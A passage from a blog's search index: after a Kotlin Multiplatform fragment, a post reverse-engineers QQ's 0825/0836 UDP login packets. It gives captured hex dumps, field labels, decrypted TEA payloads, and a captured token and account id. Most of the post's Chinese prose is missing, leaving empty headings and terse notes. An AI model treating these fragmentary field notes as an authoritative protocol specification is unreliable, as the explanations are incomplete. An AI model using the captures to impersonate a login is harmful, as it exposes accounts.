class="keyword">this</span>.dependsOn(commonMain)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> unixMain <span class="keyword">by</span> getting</span><br><span class="line"><span class="keyword">val</span> winMain <span class="keyword">by</span> getting</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ErrorSolved </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Multiplatform </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qq 0825  0836 udp </title>
      <link href="/2022/05/19/qq-0825-0836%E8%A7%A3%E6%9E%90/"/>
      <url>/2022/05/19/qq-0825-0836%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="qq-0825--0836-udp-"><a href="#qq-0825--0836-udp-" class="headerlink" title="qq 0825  0836 udp "></a>qq 0825  0836 udp </h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>0825: <a href="https://www.cnblogs.com/mRRRR/p/5288931.html">https://www.cnblogs.com/mRRRR/p/5288931.html</a><br>2016, </p><p>: <a href="https://github.com/fa-ge/PCQQ-Protocol">https://github.com/fa-ge/PCQQ-Protocol</a><br>PCQQ, , , 2018</p><p>TEA: <a href="https://github.com/ColasDAD/Py3QQTEA/blob/master/QQTEA.py">https://github.com/ColasDAD/Py3QQTEA/blob/master/QQTEA.py</a><br>QQTEA</p><p>QQ: <a href="https://bbs.kafan.cn/thread-1295613-1-1.html">https://bbs.kafan.cn/thread-1295613-1-1.html</a></p><h3 id=""><a href="#" class="headerlink" title=":"></a>:</h3><ul><li>Python, TEA, Hexmd5</li><li>dev console, , hexreplaceAll</li><li>Wireshark, , qqudp</li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>qqudp<code>02</code>, <code>03</code>, , 2, :0825 023a570825.<br><code>..</code>, </p><h3 id="udp"><a href="#udp" class="headerlink" title="udp"></a>udp</h3><h4 id="0825-udp-"><a href="#0825-udp-" class="headerlink" title="0825 udp "></a>0825 udp </h4><p>0825()</p><h4 id=""><a href="#" class="headerlink" title=":"></a>:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ec4118251291c85acf44cc810800450000bf9143000040110000c0a81f2478e81418f57b1f4000ab6d89023a5708251115731717b40300000001010100006a4b00000000b899860003144579b8da863c1beed200abf0db243954f2e40089ac685f96cf905858602e7c87068d0f3c0cb7b33b17730f79ecd4d22ffdb42b98bb1c261aa2d7055a8a41def93ade17f969335848b41b8a2e671174a6487d81259c1f0b297501b8e542f04bbcc26acb7b5608d966a76ca0e0ca80648b0eee5f28bed43bd07ea12c2342bf092bd92703</span><br></pre></td></tr></table></figure><p>hex:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0000   ec 41 18 25 12 91 c8 5a cf 44 cc 81 08 00 45 00</span><br><span class="line">0010   00 bf 91 43 00 00 40 11 00 00 c0 a8 1f 24 78 e8</span><br><span class="line">0020   14 18 f5 7b 1f 40 00 ab 6d 89 02 3a 57 08 25 11</span><br><span class="line">0030   15 73 17 17 b4 03 00 00 00 01 01 01 00 00 6a 4b</span><br><span class="line">0040   00 00 00 00 b8 99 86 00 03 14 45 79 b8 da 86 3c</span><br><span class="line">0050   1b ee d2 00 ab f0 db 24 39 54 f2 e4 00 89 ac 68</span><br><span class="line">0060   5f 96 cf 90 58 58 60 2e 7c 87 06 8d 0f 3c 0c b7</span><br><span class="line">0070   b3 3b 17 73 0f 79 ec d4 d2 2f fd b4 2b 98 bb 1c</span><br><span class="line">0080   26 1a a2 d7 05 5a 8a 41 de f9 3a de 17 f9 69 33</span><br><span class="line">0090   58 48 b4 1b 8a 2e 67 11 74 a6 48 7d 81 25 9c 1f</span><br><span class="line">00a0   0b 29 75 01 b8 e5 42 f0 4b bc c2 6a cb 7b 56 08</span><br><span class="line">00b0   d9 66 a7 6c a0 e0 ca 80 64 8b 0e ee 5f 28 be d4</span><br><span class="line">00c0   3b d0 7e a1 2c 23 42 bf 09 2b d9 27 03</span><br></pre></td></tr></table></figure><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p>qq</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0020   .. .. .. .. .. .. .. .. .. .. 02 3a 57 08 25 11</span><br><span class="line">0030   15 73 17 17 b4 03 00 00 00 01 01 01 00 00 6a 4b</span><br><span class="line">0040   00 00 00 00 .. .. .. .. .. .. .. .. .. .. .. ..</span><br></pre></td></tr></table></figure><ul><li><code>02</code> qq</li><li><code>3a 57</code> , <a href="https://bbs.kafan.cn/thread-1295613-100-1.html#:~:text=3A57%3D%22QQ9.5.9%20%E7%81%B0%E5%BA%A6%E6%AD%A3%E5%BC%8F%E7%89%88(28605/28606)%22"></a> QQ9.5.9 (28605&#x2F;28606)</li><li><code>08 25</code> </li><li><code>11 15</code> , </li><li><code>73 17 17 b4</code> qq id hex</li><li><code>03 00 00</code> fixed const</li><li><code>00 01 01 01</code> </li><li><code>00 00 6a 4b</code> </li><li><code>00 00 00 00</code> fixed const</li></ul><p>TEA, 16</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040   .. .. .. .. b8 99 86 00 03 14 45 79 b8 da 86 3c</span><br><span class="line">0050   1b ee d2 00 .. .. .. .. .. .. .. .. .. .. .. ..</span><br></pre></td></tr></table></figure><p>TEA</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0050   .. .. .. .. ab f0 db 24 39 54 f2 e4 00 89 ac 68</span><br><span class="line">0060   5f 96 cf 90 58 58 60 2e 7c 87 06 8d 0f 3c 0c b7</span><br><span class="line">0070   b3 3b 17 73 0f 79 ec d4 d2 2f fd b4 2b 98 bb 1c</span><br><span class="line">0080   26 1a a2 d7 05 5a 8a 41 de f9 3a de 17 f9 69 33</span><br><span class="line">0090   58 48 b4 1b 8a 2e 67 11 74 a6 48 7d 81 25 9c 1f</span><br><span class="line">00a0   0b 29 75 01 b8 e5 42 f0 4b bc c2 6a cb 7b 56 08</span><br><span class="line">00b0   d9 66 a7 6c a0 e0 ca 80 64 8b 0e ee 5f 28 be d4</span><br><span class="line">00c0   3b d0 7e a1 2c 23 42 bf 09 2b d9 27 ..</span><br></pre></td></tr></table></figure><p>Tea:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">001800160001 0000045f00000001000016ff 731717b4 0000 00000309000a 000a0004 78e815b6 0002003600120002000100000000000000000000000000000114001d0103 0019 027bb75bfbed8d28d1f1bcad2065b24bdc594ab8a52f60d88a 051100060a0000000001</span><br></pre></td></tr></table></figure><ul><li><code>001800160001</code> 6</li><li><code>0000045f00000001000016ff</code> 12</li><li><code>731717b4</code> qqid</li><li><code>0000</code> fixed const</li><li><code>78e815b6</code> 120.232.20.24 (dst)ip hex, <a href="https://www.browserling.com/tools/ip-to-hex"></a></li><li><code>0019</code> token25</li><li><code>027bb75bfbed8d28d1f1bcad2065b24bdc594ab8a52f60d88a</code> token</li><li><code>051100060a0000000001</code> fixed const</li></ul><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00c0   .. .. .. .. .. .. .. .. .. .. .. .. 03</span><br></pre></td></tr></table></figure><h4 id="0825-"><a href="#0825-" class="headerlink" title="0825 "></a>0825 </h4><p>0825()</p><h5 id=""><a href="#" class="headerlink" title=""></a></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c85acf44cc81ec41182512910800457400939b12400035113d0778e81418c0a81f241f40f57b007fde35023a5708251115731717b40000006bb7f0867436bf1be9b560a67834497e59f60988affe5d52594f92dde9a60e7361741a79ad9ea1180886c51514a8b9f9ddd3a38348da8b08fdac2f84a5c73758940a5c0168cc6adfca142de0ef763e7d07a9ced632930d4350fc53e5a325324146249a56d823545103</span><br></pre></td></tr></table></figure><p>hex</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0000   c8 5a cf 44 cc 81 ec 41 18 25 12 91 08 00 45 74</span><br><span class="line">0010   00 93 9b 12 40 00 35 11 3d 07 78 e8 14 18 c0 a8</span><br><span class="line">0020   1f 24 1f 40 f5 7b 00 7f de 35 02 3a 57 08 25 11</span><br><span class="line">0030   15 73 17 17 b4 00 00 00 6b b7 f0 86 74 36 bf 1b</span><br><span class="line">0040   e9 b5 60 a6 78 34 49 7e 59 f6 09 88 af fe 5d 52</span><br><span class="line">0050   59 4f 92 dd e9 a6 0e 73 61 74 1a 79 ad 9e a1 18</span><br><span class="line">0060   08 86 c5 15 14 a8 b9 f9 dd d3 a3 83 48 da 8b 08</span><br><span class="line">0070   fd ac 2f 84 a5 c7 37 58 94 0a 5c 01 68 cc 6a df</span><br><span class="line">0080   ca 14 2d e0 ef 76 3e 7d 07 a9 ce d6 32 93 0d 43</span><br><span class="line">0090   50 fc 53 e5 a3 25 32 41 46 24 9a 56 d8 23 54 51</span><br><span class="line">00a0   03</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="-1"><a href="#-1" class="headerlink" title=""></a></h5><p>qq</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0020   .. .. .. .. .. .. .. .. .. .. 02 3a 57 08 25 11</span><br><span class="line">0030   15 73 17 17 b4 00 00 00 .. .. .. .. .. .. .. ..</span><br></pre></td></tr></table></figure><ul><li><code>3a 57</code> qq</li><li><code>08 25</code> </li><li><code>11 15</code> </li><li><code>73 17 17 b4</code> qq id hex</li><li><code>00 00 00</code> fixed const</li></ul><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0030   .. .. .. .. .. .. .. .. 6b b7 f0 86 74 36 bf 1b</span><br><span class="line">0040   e9 b5 60 a6 78 34 49 7e 59 f6 09 88 af fe 5d 52</span><br><span class="line">0050   59 4f 92 dd e9 a6 0e 73 61 74 1a 79 ad 9e a1 18</span><br><span class="line">0060   08 86 c5 15 14 a8 b9 f9 dd d3 a3 83 48 da 8b 08</span><br><span class="line">0070   fd ac 2f 84 a5 c7 37 58 94 0a 5c 01 68 cc 6a df</span><br><span class="line">0080   ca 14 2d e0 ef 76 3e 7d 07 a9 ce d6 32 93 0d 43</span><br><span class="line">0090   50 fc 53 e5 a3 25 32 41 46 24 9a 56 d8 23 54 51</span><br></pre></td></tr></table></figure><p>Teatea key:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00 0112 0038 b36b6e93dd2c93a0efff4a129df6b1103e80975e46188430cc6142f62409b14d53fbfa576d2d835ddadce4d0cb8be9206ff46063c72f67f4 0017000e0001 6274c3a4 78ebbf1fd4b5000003100004 78e81418</span><br></pre></td></tr></table></figure><ul><li><code>00</code> </li><li><code>0112</code> fixed const</li><li><code>b36b6e93dd2c93a0efff4a129df6b1103e80975e46188430cc6142f62409b14d53fbfa576d2d835ddadce4d0cb8be9206ff46063c72f67f4</code> </li><li><code>0017000e0001</code> fixed const</li><li><code>6274c3a4</code> hex</li><li><code>78e81418</code> 120.232.20.24 ip hex</li></ul><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00a0   03</span><br></pre></td></tr></table></figure><h4 id="0836-"><a href="#0836-" class="headerlink" title="0836 "></a>0836 </h4><p>0836</p><h5 id="-1"><a href="#-1" class="headerlink" title=""></a></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ec4118251291c85acf44cc810800450003429144000040110000c0a81f2478e81418f57b1f40032e700c023a5708366148731717b40300000001010100006a4b00000000000201030019027bb75bfbed8d28d1f1bcad2065b24bdc594ab8a52f60d88a0000001066762c87707cf5de93d9c7e837e8e7e6883ebe9cd158374921efa7d4392e33ef9ae0965988257ce5e3b9ae9e4d31c2dfed7eb5b5da7d863de63df01b5e22bf8e383cff4ed00bfea9760cd8de7f1177effc1d716cbdf775e56e032a04dd2f2444fa9a607f3ff2bcb0f3229acc2e889dc5eb9a7f23b581b0f39b60eed3a104233c38f6736a2acd7a0ccf932fb00de2c61718c5d81ec950a2be7676eb096d84484198b11b7deb69c7680293878f6936f4ce310f1f86e44d3913c97693188f9728007b44d1f82e7a645425f6667f71c8411f424144693c034f96ed317b8e89f8b8875ab56721a1d5b6f87dac83a2be459c2460686a88ad9dbde2f5ed6a8548f3ab05ee3c1e86a81cc811596e66f1d3a26a6f5d4a80662a0bf00827a8c49837dc02e70fd51bab408ad7e3a9b807905cfbd5666bf606e72f7ba7af53424ab5dec46e0294812d70198268985fae1b13703c28e27c88d69afae91d6db9c4a83c558ba8d8ce2acc3e3fd4d0e983f80f84e2d3d3172ea1584fcf15f26190a3416deb76934dcabfec6e19d0b0d0c7d1e1a37350b8bcc9d374d1ad62361b70bc2224dfc1d39c4d94ba017ffd7c397435e188ece1c2829895d1e0ff972291a83c045a4bf85997c662dfed3a23e757211743f2de7b0ba543f93d6c9a993130b338746a5892209397dbe58735f49d4c10fc320186bbd06140e777124e0ba96a2c1d64bbde0af54bee2b0140c720b5033497a863224b971f905985c4ea411658defbd211ae53906279458c6f5682bfc5a77f6ee8908b40d72f81236d40f225fe63112813128c2a2bc5d1a399766b7e767c098c1c3ce397e3b7434ceb3996cb885b652266187489dd428dad24f57105f8c17cd34d007c57acea0a0e7a6d8af4bb96cf4508b3d733af44b739c8c997323cf7909f7486c04115d251dca4fde643f10c504e99ba3a58ba99d8a77912501ca56dd6bfec2be69d22639915e9387bb19b6ef8ae954b24aadf750b28c8727adac8ef2be125ef5618ad42780d9acbb33b4ffd196490e5b531a5e8d87c84e641878103</span><br></pre></td></tr></table></figure><p>hex</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">0000   ec 41 18 25 12 91 c8 5a cf 44 cc 81 08 00 45 00</span><br><span class="line">0010   03 42 91 44 00 00 40 11 00 00 c0 a8 1f 24 78 e8</span><br><span class="line">0020   14 18 f5 7b 1f 40 03 2e 70 0c 02 3a 57 08 36 61</span><br><span class="line">0030   48 73 17 17 b4 03 00 00 00 01 01 01 00 00 6a 4b</span><br><span class="line">0040   00 00 00 00 00 02 01 03 00 19 02 7b b7 5b fb ed</span><br><span class="line">0050   8d 28 d1 f1 bc ad 20 65 b2 4b dc 59 4a b8 a5 2f</span><br><span class="line">0060   60 d8 8a 00 00 00 10 66 76 2c 87 70 7c f5 de 93</span><br><span class="line">0070   d9 c7 e8 37 e8 e7 e6 88 3e be 9c d1 58 37 49 21</span><br><span class="line">0080   ef a7 d4 39 2e 33 ef 9a e0 96 59 88 25 7c e5 e3</span><br><span class="line">0090   b9 ae 9e 4d 31 c2 df ed 7e b5 b5 da 7d 86 3d e6</span><br><span class="line">00a0   3d f0 1b 5e 22 bf 8e 38 3c ff 4e d0 0b fe a9 76</span><br><span class="line">00b0   0c d8 de 7f 11 77 ef fc 1d 71 6c bd f7 75 e5 6e</span><br><span class="line">00c0   03 2a 04 dd 2f 24 44 fa 9a 60 7f 3f f2 bc b0 f3</span><br><span class="line">00d0   22 9a cc 2e 88 9d c5 eb 9a 7f 23 b5 81 b0 f3 9b</span><br><span class="line">00e0   60 ee d3 a1 04 23 3c 38 f6 73 6a 2a cd 7a 0c cf</span><br><span class="line">00f0   93 2f b0 0d e2 c6 17 18 c5 d8 1e c9 50 a2 be 76</span><br><span class="line">0100   76 eb 09 6d 84 48 41 98 b1 1b 7d eb 69 c7 68 02</span><br><span class="line">0110   93 87 8f 69 36 f4 ce 31 0f 1f 86 e4 4d 39 13 c9</span><br><span class="line">0120   76 93 18 8f 97 28 00 7b 44 d1 f8 2e 7a 64 54 25</span><br><span class="line">0130   f6 66 7f 71 c8 41 1f 42 41 44 69 3c 03 4f 96 ed</span><br><span class="line">0140   31 7b 8e 89 f8 b8 87 5a b5 67 21 a1 d5 b6 f8 7d</span><br><span class="line">0150   ac 83 a2 be 45 9c 24 60 68 6a 88 ad 9d bd e2 f5</span><br><span class="line">0160   ed 6a 85 48 f3 ab 05 ee 3c 1e 86 a8 1c c8 11 59</span><br><span class="line">0170   6e 66 f1 d3 a2 6a 6f 5d 4a 80 66 2a 0b f0 08 27</span><br><span class="line">0180   a8 c4 98 37 dc 02 e7 0f d5 1b ab 40 8a d7 e3 a9</span><br><span class="line">0190   b8 07 90 5c fb d5 66 6b f6 06 e7 2f 7b a7 af 53</span><br><span class="line">01a0   42 4a b5 de c4 6e 02 94 81 2d 70 19 82 68 98 5f</span><br><span class="line">01b0   ae 1b 13 70 3c 28 e2 7c 88 d6 9a fa e9 1d 6d b9</span><br><span class="line">01c0   c4 a8 3c 55 8b a8 d8 ce 2a cc 3e 3f d4 d0 e9 83</span><br><span class="line">01d0   f8 0f 84 e2 d3 d3 17 2e a1 58 4f cf 15 f2 61 90</span><br><span class="line">01e0   a3 41 6d eb 76 93 4d ca bf ec 6e 19 d0 b0 d0 c7</span><br><span class="line">01f0   d1 e1 a3 73 50 b8 bc c9 d3 74 d1 ad 62 36 1b 70</span><br><span class="line">0200   bc 22 24 df c1 d3 9c 4d 94 ba 01 7f fd 7c 39 74</span><br><span class="line">0210   35 e1 88 ec e1 c2 82 98 95 d1 e0 ff 97 22 91 a8</span><br><span class="line">0220   3c 04 5a 4b f8 59 97 c6 62 df ed 3a 23 e7 57 21</span><br><span class="line">0230   17 43 f2 de 7b 0b a5 43 f9 3d 6c 9a 99 31 30 b3</span><br><span class="line">0240   38 74 6a 58 92 20 93 97 db e5 87 35 f4 9d 4c 10</span><br><span class="line">0250   fc 32 01 86 bb d0 61 40 e7 77 12 4e 0b a9 6a 2c</span><br><span class="line">0260   1d 64 bb de 0a f5 4b ee 2b 01 40 c7 20 b5 03 34</span><br><span class="line">0270   97 a8 63 22 4b 97 1f 90 59 85 c4 ea 41 16 58 de</span><br><span class="line">0280   fb d2 11 ae 53 90 62 79 45 8c 6f 56 82 bf c5 a7</span><br><span class="line">0290   7f 6e e8 90 8b 40 d7 2f 81 23 6d 40 f2 25 fe 63</span><br><span class="line">02a0   11 28 13 12 8c 2a 2b c5 d1 a3 99 76 6b 7e 76 7c</span><br><span class="line">02b0   09 8c 1c 3c e3 97 e3 b7 43 4c eb 39 96 cb 88 5b</span><br><span class="line">02c0   65 22 66 18 74 89 dd 42 8d ad 24 f5 71 05 f8 c1</span><br><span class="line">02d0   7c d3 4d 00 7c 57 ac ea 0a 0e 7a 6d 8a f4 bb 96</span><br><span class="line">02e0   cf 45 08 b3 d7 33 af 44 b7 39 c8 c9 97 32 3c f7</span><br><span class="line">02f0   90 9f 74 86 c0 41 15 d2 51 dc a4 fd e6 43 f1 0c</span><br><span class="line">0300   50 4e 99 ba 3a 58 ba 99 d8 a7 79 12 50 1c a5 6d</span><br><span class="line">0310   d6 bf ec 2b e6 9d 22 63 99 15 e9 38 7b b1 9b 6e</span><br><span class="line">0320   f8 ae 95 4b 24 aa df 75 0b 28 c8 72 7a da c8 ef</span><br><span class="line">0330   2b e1 25 ef 56 18 ad 42 78 0d 9a cb b3 3b 4f fd</span><br><span class="line">0340   19 64 90 e5 b5 31 a5 e8 d8 7c 84 e6 41 87 81 03</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="-2"><a href="#-2" class="headerlink" title=""></a></h5><p>qq</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0020   .. .. .. .. .. .. .. .. .. .. 02 3a 57 08 36 61</span><br><span class="line">0030   48 73 17 17 b4 03 00 00 00 01 01 01 00 00 6a 4b</span><br><span class="line">0040   00 00 00 00 00 02 01 03 00 19 .. .. .. .. .. ..</span><br></pre></td></tr></table></figure><ul><li><code>02</code> qq</li><li><code>3a 57</code> qq</li><li><code>08 36</code> </li><li><code>61 48</code> </li><li><code>73 17 17 b4</code> qq id hex</li><li><code>03 00 00</code> fixed const</li><li><code>00 01 01 01</code> client type</li><li><code>00 00 6a 4b</code> </li><li><code>00 00 00 00 00</code> fixed const</li><li><code>02 01</code> subVer</li><li><code>03 00</code> echd ver</li><li><code>19</code> fixed const</li></ul><p>DhPublickey</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040   .. .. .. .. .. .. .. .. .. .. 02 7b b7 5b fb ed</span><br><span class="line">0050   8d 28 d1 f1 bc ad 20 65 b2 4b dc 59 4a b8 a5 2f</span><br><span class="line">0060   60 d8 8a .. .. .. .. .. .. .. .. .. .. .. .. ..</span><br></pre></td></tr></table></figure><p>fixed const</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0060   .. .. .. 00 00 00 10 .. .. .. .. .. .. .. .. ..</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0060   .. .. .. .. .. .. .. 66 76 2c 87 70 7c f5 de 93</span><br><span class="line">0070   d9 c7 e8 37 e8 e7 e6 .. .. .. .. .. .. .. .. ..</span><br></pre></td></tr></table></figure><p><br>DhShareKey</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">0070   .. .. .. .. .. .. .. 88 3e be 9c d1 58 37 49 21</span><br><span class="line">0080   ef a7 d4 39 2e 33 ef 9a e0 96 59 88 25 7c e5 e3</span><br><span class="line">0090   b9 ae 9e 4d 31 c2 df ed 7e b5 b5 da 7d 86 3d e6</span><br><span class="line">00a0   3d f0 1b 5e 22 bf 8e 38 3c ff 4e d0 0b fe a9 76</span><br><span class="line">00b0   0c d8 de 7f 11 77 ef fc 1d 71 6c bd f7 75 e5 6e</span><br><span class="line">00c0   03 2a 04 dd 2f 24 44 fa 9a 60 7f 3f f2 bc b0 f3</span><br><span class="line">00d0   22 9a cc 2e 88 9d c5 eb 9a 7f 23 b5 81 b0 f3 9b</span><br><span class="line">00e0   60 ee d3 a1 04 23 3c 38 f6 73 6a 2a cd 7a 0c cf</span><br><span class="line">00f0   93 2f b0 0d e2 c6 17 18 c5 d8 1e c9 50 a2 be 76</span><br><span class="line">0100   76 eb 09 6d 84 48 41 98 b1 1b 7d eb 69 c7 68 02</span><br><span class="line">0110   93 87 8f 69 36 f4 ce 31 0f 1f 86 e4 4d 39 13 c9</span><br><span class="line">0120   76 93 18 8f 97 28 00 7b 44 d1 f8 2e 7a 64 54 25</span><br><span class="line">0130   f6 66 7f 71 c8 41 1f 42 41 44 69 3c 03 4f 96 ed</span><br><span class="line">0140   31 7b 8e 89 f8 b8 87 5a b5 67 21 a1 d5 b6 f8 7d</span><br><span class="line">0150   ac 83 a2 be 45 9c 24 60 68 6a 88 ad 9d bd e2 f5</span><br><span class="line">0160   ed 6a 85 48 f3 ab 05 ee 3c 1e 86 a8 1c c8 11 59</span><br><span class="line">0170   6e 66 f1 d3 a2 6a 6f 5d 4a 80 66 2a 0b f0 08 27</span><br><span class="line">0180   a8 c4 98 37 dc 02 e7 0f d5 1b ab 40 8a d7 e3 a9</span><br><span class="line">0190   b8 07 90 5c fb d5 66 6b f6 06 e7 2f 7b a7 af 53</span><br><span class="line">01a0   42 4a b5 de c4 6e 02 94 81 2d 70 19 82 68 98 5f</span><br><span class="line">01b0   ae 1b 13 70 3c 28 e2 7c 88 d6 9a fa e9 1d 6d b9</span><br><span class="line">01c0   c4 a8 3c 55 8b a8 d8 ce 2a cc 3e 3f d4 d0 e9 83</span><br><span class="line">01d0   f8 0f 84 e2 d3 d3 17 2e a1 58 4f cf 15 f2 61 90</span><br><span class="line">01e0   a3 41 6d eb 76 93 4d ca bf ec 6e 19 d0 b0 d0 c7</span><br><span class="line">01f0   d1 e1 a3 73 50 b8 bc c9 d3 74 d1 ad 62 36 1b 70</span><br><span class="line">0200   bc 22 24 df c1 d3 9c 4d 94 ba 01 7f fd 7c 39 74</span><br><span class="line">0210   35 e1 88 ec e1 c2 82 98 95 d1 e0 ff 97 22 91 a8</span><br><span class="line">0220   3c 04 5a 4b f8 59 97 c6 62 df ed 3a 23 e7 57 21</span><br><span class="line">0230   17 43 f2 de 7b 0b a5 43 f9 3d 6c 9a 99 31 30 b3</span><br><span class="line">0240   38 74 6a 58 92 20 93 97 db e5 87 35 f4 9d 4c 10</span><br><span class="line">0250   fc 32 01 86 bb d0 61 40 e7 77 12 4e 0b a9 6a 2c</span><br><span class="line">0260   1d 64 bb de 0a f5 4b ee 2b 01 40 c7 20 b5 03 34</span><br><span class="line">0270   97 a8 63 22 4b 97 1f 90 59 85 c4 ea 41 16 58 de</span><br><span class="line">0280   fb d2 11 ae 53 90 62 79 45 8c 6f 56 82 bf c5 a7</span><br><span class="line">0290   7f 6e e8 90 8b 40 d7 2f 81 23 6d 40 f2 25 fe 63</span><br><span class="line">02a0   11 28 13 12 8c 2a 2b c5 d1 a3 99 76 6b 7e 76 7c</span><br><span class="line">02b0   09 8c 1c 3c e3 97 e3 b7 43 4c eb 39 96 cb 88 5b</span><br><span class="line">02c0   65 22 66 18 74 89 dd 42 8d ad 24 f5 71 05 f8 c1</span><br><span class="line">02d0   7c d3 4d 00 7c 57 ac ea 0a 0e 7a 6d 8a f4 bb 96</span><br><span class="line">02e0   cf 45 08 b3 d7 33 af 44 b7 39 c8 c9 97 32 3c f7</span><br><span class="line">02f0   90 9f 74 86 c0 41 15 d2 51 dc a4 fd e6 43 f1 0c</span><br><span class="line">0300   50 4e 99 ba 3a 58 ba 99 d8 a7 79 12 50 1c a5 6d</span><br><span class="line">0310   d6 bf ec 2b e6 9d 22 63 99 15 e9 38 7b b1 9b 6e</span><br><span class="line">0320   f8 ae 95 4b 24 aa df 75 0b 28 c8 72 7a da c8 ef</span><br><span class="line">0330   2b e1 25 ef 56 18 ad 42 78 0d 9a cb b3 3b 4f 